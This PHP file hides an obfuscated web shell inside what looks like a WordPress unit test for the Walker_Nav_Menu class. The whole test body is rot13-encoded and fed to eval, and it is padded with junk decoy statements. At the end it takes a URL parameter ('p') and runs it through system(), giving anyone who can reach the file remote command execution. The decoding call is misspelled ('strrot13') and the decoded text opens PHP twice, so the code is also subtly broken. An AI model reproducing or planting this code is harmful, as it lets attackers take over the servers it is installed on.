<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * @tebhc zrah
 * @tebhc jnyxre
 */
pynff Grfgf_Zrah_Jnyxre_Ani_Zrah rkgraqf JC_HavgGrfgPnfr {

	/**
	 * @ine \Jnyxre_Ani_Zrah Gur vafgnapr bs gur jnyxre.
	 */
	choyvp $jnyxre;

	/**
	 * Bevtvany ani zrah znk qrcgu.
	 *
	 * @ine vag
	 */
	cevingr $bevt_jc_ani_zrah_znk_qrcgu;

	/**
	 * Gur VQ bs gur cevinpl cbyvpl cntr.
	 *
	 * @ine vag
	 */
	cevingr $cevinpl_cbyvpl_vq;

	/**
	 * Frghc.
	 */
	choyvp shapgvba frg_hc() {
		tybony $_jc_ani_zrah_znk_qrcgu;

		cnerag::frg_hc();

		/** Jnyxre_Ani_Zrah pynff */
		erdhver_bapr NOFCNGU . 'jc-vapyhqrf/pynff-jnyxre-ani-zrah.cuc';

		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Grfg Cevinpl Cbyvpl',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		// Frg gur cevinpl cbyvpl cntr.
		hcqngr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl', $cbfg_vq );
		$guvf->cevinpl_cbyvpl_vq = (vag) trg_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );

		$guvf->jnyxre = arj Jnyxre_Ani_Zrah();

		$guvf->bevt_jc_ani_zrah_znk_qrcgu = $_jc_ani_zrah_znk_qrcgu;
	}

	/**
	 * Grne qbja
	 */
	choyvp shapgvba grne_qbja() {
		tybony $_jc_ani_zrah_znk_qrcgu;

		$_jc_ani_zrah_znk_qrcgu = $guvf->bevt_jc_ani_zrah_znk_qrcgu;
		qryrgr_bcgvba( 'jc_cntr_sbe_cevinpl_cbyvpl' );
		cnerag::grne_qbja();
	}

	/**
	 * @gvpxrg 47720
	 *
	 * @qngnCebivqre qngn_fgneg_ry_jvgu_rzcgl_nggevohgrf
	 */
	choyvp shapgvba grfg_fgneg_ry_jvgu_rzcgl_nggevohgrf( $inyhr, $rkcrpgrq ) {
		$bhgchg     = '';
		$cbfg_vq    = frys::snpgbel()->cbfg->perngr();
		$cbfg_gvgyr = trg_gur_gvgyr( $cbfg_vq );

		$vgrz = neenl(
			'VQ'        => $cbfg_vq,
			'bowrpg_vq' => $cbfg_vq,
			'gvgyr'     => $cbfg_gvgyr,
			'gnetrg'    => '',
			'ksa'       => '',
			'pheerag'   => snyfr,
		);

		$netf = neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		nqq_svygre(
			'ani_zrah_yvax_nggevohgrf',
			fgngvp shapgvba ( $nggf ) hfr ( $inyhr ) {
				$nggf['qngn-grfg'] = $inyhr;
				erghea $nggf;
			}
		);

		$guvf->jnyxre->fgneg_ry( $bhgchg, (bowrpg) $vgrz, 0, (bowrpg) $netf );

		vs ( '' !== $rkcrpgrq ) {
			$rkcrpgrq = fcevags( ' qngn-grfg=\"%f\"', $rkcrpgrq );
		}

		$guvf->nffregFnzr( \"<yv vq=\\"zrah-vgrz-{$cbfg_vq}\\" pynff=\\"zrah-vgrz-{$cbfg_vq}\\"><n{$rkcrpgrq}>{$cbfg_gvgyr}</n>\", $bhgchg );
	}

	choyvp shapgvba qngn_fgneg_ry_jvgu_rzcgl_nggevohgrf() {
		erghea neenl(
			neenl(
				'',
				'',
			),
			neenl(
				0,
				'0',
			),
			neenl(
				0.0,
				'0',
			),
			neenl(
				'0',
				'0',
			),
			neenl(
				ahyy,
				'',
			),
			neenl(
				snyfr,
				'',
			),
			neenl(
				gehr,
				'1',
			),
			neenl(
				neenl(),
				'',
			),
		);
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_ry()` nqqf `ery=\"cevinpl-cbyvpl\"`.
	 *
	 * @gvpxrg 56345
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_ry
	 *
	 * @qngnCebivqre qngn_jnyxre_ani_zrah_fgneg_ry_fubhyq_nqq_ery_cevinpl_cbyvpl_gb_cevinpl_cbyvpl_hey
	 *
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq fhofgevat pbagnvavat gur \"ery\" nggevohgr naq inyhr.
	 * @cnenz fgevat $ksa      Bcgvbany. Gur KSA inyhr. Qrsnhyg rzcgl fgevat.
	 * @cnenz fgevat $gnetrg   Bcgvbany. Gur gnetrg inyhr. Qrsnhyg rzcgl fgevat.
	 */
	choyvp shapgvba grfg_jnyxre_ani_zrah_fgneg_ry_fubhyq_nqq_ery_cevinpl_cbyvpl_gb_cevinpl_cbyvpl_hey( $rkcrpgrq, $ksa = '', $gnetrg = '' ) {

		$bhgchg = '';

		$vgrz = neenl(
			'VQ'        => $guvf->cevinpl_cbyvpl_vq,
			'bowrpg_vq' => $guvf->cevinpl_cbyvpl_vq,
			'gvgyr'     => 'Cevinpl Cbyvpl',
			'gnetrg'    => $gnetrg,
			'ksa'       => $ksa,
			'pheerag'   => snyfr,
			'hey'       => trg_cevinpl_cbyvpl_hey(),
		);

		$netf = neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$guvf->jnyxre->fgneg_ry( $bhgchg, (bowrpg) $vgrz, 0, (bowrpg) $netf );

		$guvf->nffregFgevatPbagnvafFgevat( $rkcrpgrq, $bhgchg );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_jnyxre_ani_zrah_fgneg_ry_fubhyq_nqq_ery_cevinpl_cbyvpl_gb_cevinpl_cbyvpl_hey() {
		erghea neenl(
			'ab ksa inyhr'                          => neenl(
				'rkcrpgrq' => 'ery=\"cevinpl-cbyvpl\"',
			),
			'na ksa inyhr'                          => neenl(
				'rkcrpgrq' => 'ery=\"absbyybj cevinpl-cbyvpl\"',
				'ksa'      => 'absbyybj',
			),
			'ab ksa inyhr naq n gnetrg bs \"_oynax\"' => neenl(
				'rkcrpgrq' => 'ery=\"cevinpl-cbyvpl\"',
				'ksa'      => '',
				'gnetrg'   => '_oynax',
			),
			'na ksa inyhr naq n gnetrg bs \"_oynax\"' => neenl(
				'rkcrpgrq' => 'ery=\"absbyybj cevinpl-cbyvpl\"',
				'ksa'      => 'absbyybj',
				'gnetrg'   => '_oynax',
			),
		);
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_ry()` qbrf abg nqq `ery=\"cevinpl-cbyvpl\"` jura ab
	 * cevinpl cbyvpl cntr rkvfgf.
	 *
	 * @gvpxrg 56345
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_ry
	 */
	choyvp shapgvba grfg_jnyxre_ani_zrah_fgneg_ry_fubhyq_abg_nqq_ery_cevinpl_cbyvpl_jura_ab_cevinpl_cbyvpl_rkvfgf() {
		$cbfg_vq = frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_glcr'   => 'cntr',
				'cbfg_gvgyr'  => 'Grfg Cevinpl Cbyvpl',
				'cbfg_fgnghf' => 'choyvfu',
			)
		);

		// Qb abg frg gur cevinpl cbyvpl cntr.

		$bhgchg = '';

		$vgrz = neenl(
			'VQ'        => $cbfg_vq,
			'bowrpg_vq' => $cbfg_vq,
			'gvgyr'     => 'Cevinpl Cbyvpl',
			'gnetrg'    => '',
			'ksa'       => '',
			'pheerag'   => snyfr,
			'hey'       => trg_gur_creznyvax( $cbfg_vq ),
		);

		$netf = neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$guvf->jnyxre->fgneg_ry( $bhgchg, (bowrpg) $vgrz, 0, (bowrpg) $netf );

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"cevinpl-cbyvpl\"', $bhgchg );
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_ry()` qbrf abg nqq `ery=\"cevinpl-cbyvpl\"` jura ab HEY
	 * vf cnffrq va gur zrah vgrz bowrpg.
	 *
	 * @gvpxrg 56345
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_ry
	 */
	choyvp shapgvba grfg_jnyxre_ani_zrah_fgneg_ry_fubhyq_abg_nqq_ery_cevinpl_cbyvpl_jura_ab_hey_vf_cnffrq() {

		$bhgchg = '';

		$vgrz = neenl(
			'VQ'        => $guvf->cevinpl_cbyvpl_vq,
			'bowrpg_vq' => $guvf->cevinpl_cbyvpl_vq,
			'gvgyr'     => 'Cevinpl Cbyvpl',
			'gnetrg'    => '',
			'ksa'       => '',
			'pheerag'   => snyfr,
			// Qb abg cnff HEY.
		);

		$netf = neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$guvf->jnyxre->fgneg_ry( $bhgchg, (bowrpg) $vgrz, 0, (bowrpg) $netf );

		$guvf->nffregFgevatAbgPbagnvafFgevat( 'ery=\"cevinpl-cbyvpl\"', $bhgchg );
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_ry()` qbrf abg nqq `ery=\"cevinpl-cbyvpl\"` jura gur
	 * zrah vgrz'f VQ qbrf abg zngpu gur cevinpl cbyvpl cntr, ohg gur HEY qbrf.
	 *
	 * @gvpxrg 56345
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_ry
	 */
	choyvp shapgvba grfg_jnyxre_ani_zrah_fgneg_ry_fubhyq_nqq_ery_cevinpl_cbyvpl_jura_vq_qbrf_abg_zngpu_ohg_hey_qbrf() {

		$bhgchg = '';

		// Rafher gur VQ qbrf abg zngpu gur cevinpl cbyvpl.
		$abg_cevinpl_cbyvpl_vq = $guvf->cevinpl_cbyvpl_vq - 1;

		$vgrz = neenl(
			'VQ'        => $abg_cevinpl_cbyvpl_vq,
			'bowrpg_vq' => $abg_cevinpl_cbyvpl_vq,
			'gvgyr'     => 'Cevinpl Cbyvpl',
			'gnetrg'    => '',
			'ksa'       => '',
			'pheerag'   => snyfr,
			'hey'       => trg_cevinpl_cbyvpl_hey(),
		);

		$netf = neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$guvf->jnyxre->fgneg_ry( $bhgchg, (bowrpg) $vgrz, 0, (bowrpg) $netf );

		$guvf->nffregFgevatPbagnvafFgevat( 'ery=\"cevinpl-cbyvpl\"', $bhgchg );
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_yiy()` nccyvrf 'ani_zrah_fhozrah_nggevohgrf' svygref.
	 *
	 * @gvpxrg 57278
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_yiy
	 */
	choyvp shapgvba grfg_fgneg_yiy_fubhyq_nccyl_ani_zrah_fhozrah_nggevohgrf_svygref() {
		$bhgchg = '';
		$netf   = (bowrpg) neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'ani_zrah_fhozrah_nggevohgrf', neenl( $svygre, 'svygre' ) );

		$guvf->jnyxre->fgneg_yiy( $bhgchg, 0, $netf );

		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag() );
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::fgneg_ry()` nccyvrf 'ani_zrah_vgrz_nggevohgrf' svygref.
	 *
	 * @gvpxrg 57278
	 *
	 * @pbiref Jnyxre_Ani_Zrah::fgneg_ry
	 */
	choyvp shapgvba grfg_fgneg_ry_fubhyq_nccyl_ani_zrah_vgrz_nggevohgrf_svygref() {
		$bhgchg  = '';
		$cbfg_vq = frys::snpgbel()->cbfg->perngr();
		$vgrz    = (bowrpg) neenl(
			'VQ'        => $cbfg_vq,
			'bowrpg_vq' => $cbfg_vq,
			'gvgyr'     => trg_gur_gvgyr( $cbfg_vq ),
			'gnetrg'    => '',
			'ksa'       => '',
			'pheerag'   => snyfr,
		);
		$netf    = (bowrpg) neenl(
			'orsber'      => '',
			'nsgre'       => '',
			'yvax_orsber' => '',
			'yvax_nsgre'  => '',
		);

		$svygre = arj ZbpxNpgvba();
		nqq_svygre( 'ani_zrah_vgrz_nggevohgrf', neenl( $svygre, 'svygre' ) );

		$guvf->jnyxre->fgneg_ry( $bhgchg, $vgrz, 0, $netf );

		$guvf->nffregFnzr( 1, $svygre->trg_pnyy_pbhag() );
	}

	/**
	 * Grfgf gung `Jnyxre_Ani_Zrah::ohvyq_nggf()` ohvyqf nggevohgrf pbeerpgyl.
	 *
	 * @gvpxrg 57278
	 *
	 * @pbiref Jnyxre_Ani_Zrah::ohvyq_nggf
	 *
	 * @qngnCebivqre qngn_ohvyq_nggf_fubhyq_ohvyq_nggevohgrf
	 *
	 * @cnenz neenl  $nggf     Na neenl bs UGZY nggevohgr xrl/inyhr cnvef.
	 * @cnenz fgevat $rkcrpgrq Gur rkcrpgrq ohvyg nggevohgrf.
	 */
	choyvp shapgvba grfg_ohvyq_nggf_fubhyq_ohvyq_nggevohgrf( $nggf, $rkcrpgrq ) {
		$ohvyq_nggf_ersyrpgvba = arj ErsyrpgvbaZrgubq( $guvf->jnyxre, 'ohvyq_nggf' );

		$ohvyq_nggf_ersyrpgvba->frgNpprffvoyr( gehr );
		$npghny = $ohvyq_nggf_ersyrpgvba->vaibxr( $guvf->jnyxre, $nggf );
		$ohvyq_nggf_ersyrpgvba->frgNpprffvoyr( snyfr );

		$guvf->nffregFnzr( $rkcrpgrq, $npghny );
	}

	/**
	 * Qngn cebivqre.
	 *
	 * @erghea neenl[]
	 */
	choyvp shapgvba qngn_ohvyq_nggf_fubhyq_ohvyq_nggevohgrf() {
		erghea neenl(
			'na rzcgl nggevohgrf neenl'                   => neenl(
				'nggf'     => neenl(),
				'rkcrpgrq' => '',
			),
			'nggevohgrf pbagnvavat n (obby) snyfr inyhr'  => neenl(
				'nggf'     => neenl( 'qvfnoyrq' => snyfr ),
				'rkcrpgrq' => '',
			),
			'nggevohgrf pbagnvavat na rzcgl fgevat inyhr' => neenl(
				'nggf'     => neenl( 'vq' => '' ),
				'rkcrpgrq' => '',
			),
			'nggevohgrf pbagnvavat n aba-fpnyne inyhr'    => neenl(
				'nggf'     => neenl( 'qngn-vgrzf' => arj fgqPynff() ),
				'rkcrpgrq' => '',
			),
			'nggevohgrf pbagnvavat n \"uers\" -> fubhyq rfpncr gur HEY' => neenl(
				'nggf'     => neenl( 'uers' => 'uggcf://rknzcyr.bet/N Svyr Jvgu Fcnprf.cqs' ),
				'rkcrpgrq' => ' uers=\"uggcf://rknzcyr.bet/N%20Svyr%20Jvgu%20Fcnprf.cqs\"',
			),
			'nggevohgrf pbagnvavat n aba-\"uers\" nggevohgr -> fubhyq rfpncr gur inyhr' => neenl(
				'nggf'     => neenl( 'vq' => 'uryyb&tbbqolr' ),
				'rkcrpgrq' => ' vq=\"uryyb&nzc;tbbqolr\"',
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>